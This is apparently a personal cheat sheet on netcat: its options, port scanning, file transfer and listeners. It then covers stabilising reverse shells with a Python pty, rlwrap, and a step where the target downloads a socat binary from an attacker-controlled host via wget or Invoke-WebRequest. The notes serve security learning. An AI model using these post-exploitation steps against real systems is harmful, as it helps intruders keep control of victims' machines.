Netcat is a networking tool that's used for reading from and writing to network connections using TCP or UDP

* Can function as a client that connects to a listening port
* Can function as a server that listens on a port of your choice

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Netcat Options

| Netcat Option | Purpose |
| --- | --- |
| -l | Listen mode |
| -p | Specify the port number (Port numbers less than 1024 require root privileges to listen on) |
| -n | Numeric only (No resolution of hostnames via DNS) |
| -v | Verbose output |
| -vv | Very verbose output |
| -k | Keep listening after a client disconnects from the port |

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Netcat Features

| Netcat Feature | Description | 
| --- | --- |
| Port Scanning | Scan for open ports on a target system |
| File Transfer | Send and receive files between two hosts |
| Chatting | Create a simple chat server between two hosts |
| Port Listening | Listen on a specific port for incoming connections |
| Banner Grabbing | Fetch information from services running on open ports |
| Proxying | Can act as a simple network proxy |

## Port Scanning 

```Bash
nc -zv <hostname> <port_range>
```

## File Transfer 

```Bash
# From sender's machine
nc -lp <port_number> < <file_to_send>

# From receiver's machine
nc <hostname> <port_number> > <file_to_receive> 
```

## Chatting

```Bash
# From listening machine
nc -lp <port_number>

# From connecting machine
nc <hostname> <port_number>
```

## Port Listening (Netcat as a Server)

```Bash
nc -lvnp <port_number>
```

## Banner Grabbing (Netcat as a Client)

```Bash
nc <hostname> <port_number>
```

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Netcat Shell Stabilization

* Non-interactive by default
* Very unstable by default (Ex: *Pressing CTRL + C kills the whole thing*) due to netcat shells being processes running inside a terminal, rather than being bonafide terminals 

## Netcat Shell Stabilization Using Python

```Bash
# 1. Spawn a better featured shell using Python
python -c 'import pty;pty.spawn("/bin/bash")'

# 2. Give yourself access to term commands
export TERM=xterm

# 3. CTRL + Z to background the shell

# 4. Turn off our own terminal echo and then foreground the shell
stty raw -echo; fg
```

* Only applicable to Linux boxes since they nearly always have Python installed by default
* Return your own terminal back to normal by entering `reset` in your own terminal

## Netcat Shell Stabilization Using rlwrap

```Bash
# 1. Install rlwrap
sudo apt -y install rlwrap

# 2. Use rlwrap to invoke a slightly different listener
rlwrap nc -lvnp <port_number>
```

* rlwrap gives us access to history, tab autocompletion, and the arrow keys immediately upong receiving a shell (Some manual stabilisation may be required if you want to be able to use CTRL + C inside the shell)
* Particularly used when dealing with Windows shells since they're usually difficult to stabilise

## Netcat Shell Stabilization Using Socat

```Bash
# 1. Create a webserver on the attacking machine inside the directory containing your socat static compiled binary
sudo python3 -m http.server 80

```Bash
# 2. Use the netcat shell that's connected to the target machine to download the socat static compiled binary
wget <attacking_machine_address>/<socat_static_compiled_binary_file> -O /tmp/socat
```

```PowerShell
# 2. Use the netcat shell that's connected to the target machine to download the socat static compiled binary
Invoke-WebRequest -uri <attacking_machine_address>/<socat_static_compiled_binary_file>.exe -outfile C:\\Windows\temp\socat.exe
```

* Limited to Linux targets (Socat shells on Windows are usually no more stable than a netcat shell)
